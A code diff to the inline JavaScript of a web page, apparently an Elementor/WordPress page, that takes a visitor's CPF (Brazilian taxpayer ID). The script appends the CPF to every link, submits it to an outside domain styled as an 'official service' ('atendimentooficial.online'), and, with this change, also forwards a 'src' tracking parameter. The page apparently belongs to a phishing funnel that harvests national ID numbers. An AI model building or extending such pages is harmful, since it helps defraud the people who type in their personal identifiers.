@@ -238,11 +238,13 @@ var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false
         var links = document.getElementsByTagName("a");
         var cpfInput = document.getElementById('cpf');
         var submitBtn = document.getElementById('submitBtn');
+        var srcParam = getParameterByName('src');
 
         for (var i = 0, n = links.length; i < n; i++) {
             var href = links[i].href.trim() +
                     (links[i].href.indexOf("?") > 0 ? '&' : '?') +
-                    'cpf=' + encodeURIComponent(cpfInput.value.trim());
+                    'cpf=' + encodeURIComponent(cpfInput.value.trim()) +
+                    (srcParam ? '&src=' + encodeURIComponent(srcParam) : '');
 
             links[i].href = href;
         }
@@ -250,12 +252,23 @@ var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false
         // Adiciona um ouvinte de evento ao botão de envio
         submitBtn.addEventListener('click', function() {
             var formAction = 'https://web.atendimentooficial.online/diafinal';
-            var formParams = 'cpf=' + encodeURIComponent(cpfInput.value.trim());
+            var formParams = 'cpf=' + encodeURIComponent(cpfInput.value.trim()) +
+                             (srcParam ? '&src=' + encodeURIComponent(srcParam) : '');
             var formURL = formAction + '?' + formParams;
 
             // Altera o atributo "action" do formulário para incluir os parâmetros do CPF
             document.querySelector('form').action = formURL;
         });
+    }
+
+    // Função para obter parâmetros da URL
+    function getParameterByName(name) {
+        name = name.replace(/[\[\]]/g, '\\$&');
+        var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+            results = regex.exec(window.location.href);
+        if (!results) return null;
+        if (!results[2]) return '';
+        return decodeURIComponent(results[2].replace(/\+/g, ' '));
     }
 </script>
 </html>
